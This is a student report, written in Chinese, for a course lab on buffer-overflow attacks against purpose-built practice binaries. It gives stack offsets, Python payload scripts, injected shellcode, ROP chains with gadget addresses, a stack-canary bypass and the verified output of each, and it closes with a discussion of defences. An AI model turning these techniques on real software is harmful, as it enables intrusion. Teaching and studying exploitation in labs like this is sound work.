# Lab 3 Attack Lab 实验报告

- 姓名：陈钰泉
- 学号：24307090037
- 日期：2026-11-24

> 实验环境：x86-64 Linux，GCC / GDB / objdump。四个任务的 payload 均在本地复现成功，
> 且在 **ASLR 开启**（`randomize_va_space=2`）下多次稳定命中（下文给出验证输出）。
> 运行方式：`python3 payloadX.py | ./attack/<binary>`（需在含 `malware` 的目录下执行）。
> 判分标志：Task 1 看 `You have successfully detonated the bomb! Congratulations!`；
> Task 2/3/4 均看调用未使用的 `grade_eval` 后输出的 `Hope A will be your grade!`。

---

## 0. 三个目标程序的保护机制概览

用 `readelf`、运行时 `/proc/pid/maps` 及 int3 探针逐一确认：

| 程序 | PIE | 栈可执行 | Canary | system@plt | grade_eval | 手法 |
|------|-----|---------|--------|-----------|------------|------|
| `dark-calc`    | 否 | **是** | 无 | 0x4017e0 | 0x401a87 | 溢出改返回地址 / 栈注入 shellcode |
| `dark-calc-nx` | 否 | 否(NX) | 无 | 0x401680 | 0x401978 | ROP |
| `dark-log`     | 否 | 否(NX) | **有** | 无 | 0x401677 | 覆盖 len 绕过 canary + ROP |

**关于 `dark-calc` 的可执行栈：** 其 ELF `GNU_STACK` 位虽为 `RW`，但程序里有
`init_fixed_stack()`，在 `__wrap_main` 中把栈切到一块固定地址的可执行内存：

```asm
init_fixed_stack:
    movabs $0x721000000000, %rdi      ; addr（MAP_FIXED）
    mov    $0x802000, %rsi            ; length
    mov    $0x7, %edx                 ; prot = READ|WRITE|EXEC   ← 可执行
    mov    $0x100022, %ecx            ; flags = MAP_PRIVATE|ANON|FIXED
    call   mmap@plt
__wrap_main:
    mov    %rsp, %r12
    mov    fixed_stack_top(%rip), %rsp ; 切到固定栈顶 (0x721000...)
    call   main
```

两条结论很关键：
1. `dark-calc` 运行时栈位于 **固定地址 `0x721000000000` 区间且 RWX 可执行**。
2. 该地址由 `MAP_FIXED` 写死，**与 ASLR 无关**，所以栈注入所需缓冲区地址是定值；
   本地在 ASLR 开启时连续命中，印证了这一点。

> 一般而言栈地址随 ASLR 变化、不可硬编码（实验文档也提醒了这点，并说 GDB 为调试默认关 ASLR）；
> 本题是出题人用固定可执行栈特意为“栈注入”保留的可利用条件。另两个二进制（nx / log）用的是
> 正常的随机化栈，但它们用 ROP，只依赖 **固定的代码地址（non-PIE）**，同样与 ASLR 无关。

---

## 1. 任务：观察栈帧 `input`（20 pts）

`dark-calc` 的 `input()` 反汇编关键部分：

```asm
input:
  push %rbp
  mov  %rsp,%rbp
  sub  $0x10,%rsp                 ; 16 字节局部空间
  lea  -0x10(%rbp),%rax
  mov  %rax,%rdi
  call gets@plt                   ; gets(expression) —— 无边界检查，漏洞所在
  ...
  lea  -0x10(%rbp),%rax
  mov  %rax,%rsi
  mov  $0x6030d0,%edi             ; &command_buf (.bss)
  call strcpy@plt                 ; strcpy(command_buf, expression)
  leave
  ret
```

源码 `char expression[MAXLEN+1]`（MAXLEN=15 即 16 字节）正好对应 `sub $0x10`。

**栈帧布局（低→高）：**
```
  rbp-0x10  +----------------------+
            |  expression[16]      |  ← gets 从这里向高地址溢出
  rbp+0x00  |  saved rbp (8)       |
  rbp+0x08  |  return address (8)  |  ← 覆盖它即可劫持控制流
            +----------------------+
```

**从缓冲区首字节到返回地址的偏移 = 16 + 8 = 24 字节。**

> GDB 验证：在 `input` 的 `ret`(0x4019d6) 断下，喂入 40 字节标记串
> `ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcd`，观察到 `$rsp`（返回地址槽）处正是第 25~32
> 字节 `YZ012345`，saved rbp 被第 17~24 字节 `QRSTUVWX` 覆盖，与推算一致。

---

## 2. 用不同长度的字符串输入测试 `dark-calc`（5 pts）

正常逻辑：`input` 读入 → `eval` 包成 `echo $(( <前15字符> ))` 交 `system` 执行
（`eval` 内 `len=min(strlen,15)`，只取前 15 个字符）。实测：

| 输入长度 | 现象 |
|---------|------|
| 0（空行） | 走 `puts(answer)` 分支，打印 `42_is_The_Ànswer` 后 `exit(0)` |
| 3 `1+2` | `Executing: echo $((1+2))`，输出 3 |
| 10 | 正常计算 |
| 15 | 正好 MAXLEN，完整参与：`echo $((123456789012345))` |
| 22 | 超 15，被 `eval` 截断为前 15 字符（后 7 字符丢弃） |
| 32（>24）| **段错误**：返回地址被非法值覆盖，`input` 返回时崩溃 |

结论：≤15 正常；16~24 会污染 saved rbp 但返回地址未坏；**≥25 字符即覆盖返回地址导致崩溃**——
正是可利用的缓冲区溢出。

---

## 3. 任务：利用缓冲区漏洞执行 `./malware`（25 pts 测试 + 5 pts 报告）

**手法：栈溢出覆盖返回地址，复用 `eval` 的 `system(command_buf)` 调用点。**

实验文档明确要求提交的 payload 必须使用溢出。关键观察：`input` 在返回前执行了
`strcpy(command_buf, expression)`，于是只要输入以 `"./malware\0"` 开头，
`command_buf` 就等于 `"./malware"`。再把返回地址改成 `eval` 里这段代码的地址：

```asm
0x401a6b:  mov $0x6030d0,%edi      ; rdi = &command_buf
0x401a70:  call system@plt         ; system(command_buf) = system("./malware")
```

`input` ret 后直接跳到 `0x401a6b`，即以 `command_buf` 为参数调用 `system`，运行 `./malware`。
`dark-calc` 作为父进程经 `system`→`sh` fork 出 `malware`，满足 `malware` 的进程名自校验。

payload（偏移 24，`payload.py`）：
```
[ "./malware\0" + 'A' 填充 到 24B ][ 返回地址 = 0x401a6b ]
```
```python
p  = b"./malware\x00"
p += b"A" * (24 - len(p))
p += struct.pack("<Q", 0x401a6b)
sys.stdout.buffer.write(p + b"\n")
```

**验证**（ASLR 开启，多次稳定）：
```
### The bomb was triggered by the dark-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###
```

> 栈对齐：ret 到 0x401a6b 后，`call system` 时 `rsp` 满足 `rsp%16==8`（标准调用约定），
> `system` 内部不会因 movaps 崩溃。

---

## 4. 用 GDB 检查 `main` 函数的机器码（5 pts）

```
(gdb) disassemble main          （或 x/8i main）
0x401ac3 <+0>:  55                 push   %rbp
0x401ac4 <+1>:  48 89 e5           mov    %rsp,%rbp
0x401ac7 <+4>:  b8 00 00 00 00     mov    $0x0,%eax
0x401acc <+9>:  e8 a6 fe ff ff     call   0x401977 <input>
0x401ad1 <+14>: b8 00 00 00 00     mov    $0x0,%eax
0x401ad6 <+19>: e8 fc fe ff ff     call   0x4019d7 <eval>
0x401adb <+24>: eb ea              jmp    0x401ac7 <main+4>
```

要点：
- `main` 就是 `while(1){ input(); eval(); }` 的死循环（`jmp` 回 `main+4`），自身不返回；
  程序退出靠 `input` 空输入分支里的 `exit(0)`。
- 两处 `call` 是 5 字节相对调用 `e8 <rel32>`，目标 = 下一条指令地址 + rel32。
  例如 `call input`：`0x401ad1 + (符号扩展 0xfffffea6 = -0x15a) = 0x401977`，正是 `input`。
- `mov $0x0,%eax` 是调用无原型/变参函数前把 `al`（向量寄存器个数）清零的惯例。

---

## 5. 任务：栈空间执行（25 pts 测试 + 5 pts 报告）

**手法：把 shellcode 放到可执行栈上，溢出改返回地址跳回去执行；shellcode 调用 `grade_eval(4)`。**

由第 0 节，`dark-calc` 的栈固定且 RWX，可直接执行注入代码。grade_eval 的首个参数经 `edi`
传入（x86-64 调用约定），置 4 即打印 `Hope A will be your grade!`。

shellcode（21 字节）：
```asm
    mov  edi, 4            ; grade_eval(4)
    mov  eax, 0x401a87     ; &grade_eval（non-PIE 固定地址）
    call rax
    mov  eax, 0x3c         ; SYS_exit
    xor  edi, edi
    syscall                ; 干净退出
```

payload 布局（总长 32B，远在栈顶边界内，`payload_dark.py`）：
```
[ shellcode 21B ][ pad 3B ][ ret = 0x721000800fd0 ]
   offset 0..20      21..23    24..31 返回地址 -> shellcode 起点
```
返回地址 = 缓冲区首地址 `0x721000800fd0`，由固定栈 (`MAP_FIXED`) 确定、与 ASLR 无关；
换环境可在 `input` 的 `ret` 处 `printf "%p\n", $rsp-24` 重测。

**验证**（ASLR 开启，多次稳定）：
```
 Hope A will be your grade!
```

---

## 6. 任务：ROP（10 pts 测试 + 10 pts 报告）

目标 `dark-calc-nx`：栈不可执行（int3 探针触发 SIGSEGV）、栈地址随机化、non-PIE。
不能注入 shellcode，改用 **ROP** 串联现成 gadget 调用 `grade_eval(4)`。
因为 non-PIE，代码地址固定，整条链与栈地址无关、ASLR 下稳定。

gadget（文档提示在 0x4019d0~0x401ae3 间，objdump 搜 pop）：
```
pop rdi; ret = 0x401a33   (__libc_csu_init 内)
ret (对齐)   = 0x401a34
grade_eval   = 0x401978
```

payload 布局（返回地址偏移同为 24，`payload_rop.py`）：
```
[ 'A'*24 ][ ret 对齐 ][ pop rdi ][ 4 ][ grade_eval ]
```
控制流：`input` ret → `ret`(对齐) → `pop rdi`（rdi←4）→ `ret` → `grade_eval(4)`。
额外插一个裸 `ret` 做 **16 字节栈对齐**，否则 `grade_eval` 里的 `printf` 会因 movaps 未对齐
崩溃（文档亦提示此坑；调试时实测确认）。

**验证**（ASLR 开启，多次稳定）：
```
 Hope A will be your grade!
```

---

## 7. 任务：Canary（10 pts 测试 + 10 pts 报告）

目标 `dark-log` 开启了栈保护（Stack Protector / canary）。其 `input` 有逻辑漏洞：

```c
struct log_frame { char expression[128]; char logMsg[128]; int len; char pad[8]; };
gets(f.expression);                             // 无边界，可一路覆盖
memcpy(f.logMsg + f.len, f.expression, 128);    // 目的地址 = logMsg + len（len 可被覆盖）
```

反汇编得栈帧偏移（相对 rbp）：
```
expression = rbp-0x120    logMsg = rbp-0xA0    len = rbp-0x20    canary = rbp-0x8
saved rbp  = rbp+0x00     return addr = rbp+0x08
```

**绕过思路——让 memcpy “跳过” canary 去写返回地址：**

1. `gets(expression)` 先把输入写到 `len` 字段（位于 `expression+0x100`），令 `len = 0xA8`；
   但 **输入长度严格 < 0x118(=280，canary 相对 expression 的偏移)**，故 `gets` 本身不碰 canary。
2. 随后 `memcpy` 目的地址 = `logMsg + len` = `(rbp-0xA0)+0xA8` = `rbp+8`，**正是返回地址**；
   它把 `expression[0..127]` 整块复制到“返回地址开始处”，这段写入从返回地址往高地址去，
   **恰好绕开位于 `rbp-0x8` 的 canary**，canary 保持原值。
3. 函数尾部 canary 校验通过（不触发 `__stack_chk_fail`），`leave/ret` 跳到我们写入的 ROP 链。

ROP 目标：`dark-log` **没有 `system@plt`**，用 `pop rdi` 把 4 传给 `grade_eval`，
打印 `Hope A will be your grade!` 作为控制流被成功劫持的证据。
地址：`pop rdi;ret = 0x4018a3`，`grade_eval = 0x401677`；non-PIE，与栈地址无关。

payload（`expression[0..127]` 即最终落到返回地址处的 ROP 链，`payload_canary.py`）：
```
expression[0..7]    = pop rdi;ret
expression[8..15]   = 4
expression[16..23]  = grade_eval
expression[24..255] = 填充
expression[256..259]= len = 0xA8        (总长 260 < 280，canary 不被碰)
```

**验证**（ASLR 开启）：输出 ` Hope A will be your grade!`，且**全程无** `*** stack smashing detected ***`，
证明 canary 未被破坏、绕过成功。

**思考题——如何通过重排局部变量来抵御此攻击？**
本漏洞之所以成立，是因为可被溢出改写的 `len` 位于缓冲区 `expression` 之后、又被当作 memcpy 的
偏移使用，使攻击者能“操纵写入落点跨过 canary”。防御方法是**把编译器/程序员可控的变量顺序调整为：
所有字符数组（缓冲区）放在栈帧的最高地址一侧（紧邻 canary / 返回地址之前），而像 `len` 这类
标量控制变量放在缓冲区的更低地址处**。这样：

- 溢出 `expression` 时会**先**越过 canary 才可能触及返回地址，无法再“绕过”它——canary 必被破坏，
  `__stack_chk_fail` 触发，攻击失败；
- `len` 位于缓冲区下方，溢出写入根本到不了它，无法再被篡改成任意偏移。

事实上 GCC 的 Stack Protector（`-fstack-protector`）本就会把**字符数组重排到栈帧靠近 canary 的
位置、标量放在其下方**，正是为此。本题的 `struct log_frame` 把 `expression`/`logMsg` 放在 `len`
之前、且 memcpy 用结构体成员 `len` 做偏移，等于人为绕过了这种保护布局；只要让 `len`（或按结构体成员
顺序把标量放到数组之前）位于数组下方，攻击即不再可行。

---

## 8. 小结

| 任务 | 目标程序 | 保护 | 手法 | 结果 |
|------|---------|------|------|------|
| 1 执行 malware | dark-calc | 可执行栈 | 溢出改返回地址→eval 的 system(command_buf) | ✅ 引爆 |
| 2 栈空间执行 | dark-calc | 固定可执行栈 | 栈注入 shellcode→grade_eval(4) | ✅ Hope A |
| 3 ROP | dark-calc-nx | NX | ROP→grade_eval(4) | ✅ Hope A |
| 4 Canary | dark-log | NX+Canary | 覆盖 len 绕过 canary→grade_eval(4) | ✅ Hope A |

核心收获：
- 缓冲区溢出的本质是 `gets` 等无边界函数让用户数据越过缓冲区覆盖 saved rbp / 返回地址。
- 攻击不必自己写代码，可**复用程序已有的指令/函数**（ret2code、ROP）。
- NX 让“栈上注入 shellcode”失效，但 ROP 复用已有代码即可绕过；非 PIE 使代码地址固定，ROP 稳定。
- Canary 并非万能：当溢出能**绕过** canary 所在位置（如本题通过可控的 `len` 让 memcpy 落点跨过它）
  时，仍可在不破坏 canary 的前提下改写返回地址；正确的局部变量布局（数组靠近 canary）才能堵住它。
